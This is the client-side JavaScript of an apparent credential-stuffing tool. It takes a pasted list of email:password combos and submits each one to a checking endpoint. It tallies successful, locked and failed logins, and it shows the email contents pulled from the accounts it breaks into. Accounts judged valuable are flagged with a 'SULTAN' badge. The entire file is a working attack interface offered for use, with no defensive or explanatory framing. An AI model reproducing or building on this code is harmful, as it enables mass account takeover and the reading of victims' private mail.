let isRunning = false;
let stats = { checked: 0, hit: 0, bad: 0, locked: 0 };
const modal = document.getElementById('emailModal');

function updateStats() {
    document.getElementById('s-checked').innerText = stats.checked;
    document.getElementById('s-hit').innerText = stats.hit;
    document.getElementById('s-bad').innerText = stats.bad;
    document.getElementById('s-locked').innerText = stats.locked;
}

function addRow(data) {
    const row = document.createElement('tr');
    const badge = data.isSultan ? `<span class="badge-sultan">SULTAN</span>` : `<span style="color:#3fb950">HIT</span>`;
    
    // Simpan body email di window object agar bisa dipanggil modal
    const emailId = `mail_${Date.now()}`;
    window[emailId] = data.body;

    row.innerHTML = `
        <td>${data.combo.split(':')[0]}</td>
        <td>${badge}</td>
        <td style="color:#888">${data.preview}</td>
        <td><button onclick="viewMail('${emailId}')" class="btn-primary" style="padding:4px 8px; font-size:10px">VIEW CONTENT</button></td>
    `;
    document.getElementById('res-table').prepend(row);
}

function viewMail(id) {
    document.getElementById('mail-body').innerText = window[id] || "No Content Available";
    modal.style.display = "block";
}

function closeModal() { modal.style.display = "none"; }

document.getElementById('start-btn').onclick = async () => {
    const lines = document.getElementById('inp-combos').value.split('\n').filter(l => l.includes(':'));
    if (lines.length === 0) return alert("Combo list empty!");

    isRunning = true;
    document.getElementById('start-btn').disabled = true;
    document.getElementById('stop-btn').disabled = false;

    for (let line of lines) {
        if (!isRunning) break;
        try {
            const res = await fetch('/api/check', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ combo: line.trim() })
            });
            const data = await res.json();
            stats.checked++;
            if (data.status === 'HIT') { stats.hit++; addRow(data); }
            else if (data.status === 'LOCKED') { stats.locked++; }
            else { stats.bad++; }
            updateStats();
        } catch (e) { stats.bad++; updateStats(); }
    }
    isRunning = false;
    document.getElementById('start-btn').disabled = false;
}

document.getElementById('stop-btn').onclick = () => { isRunning = false; };
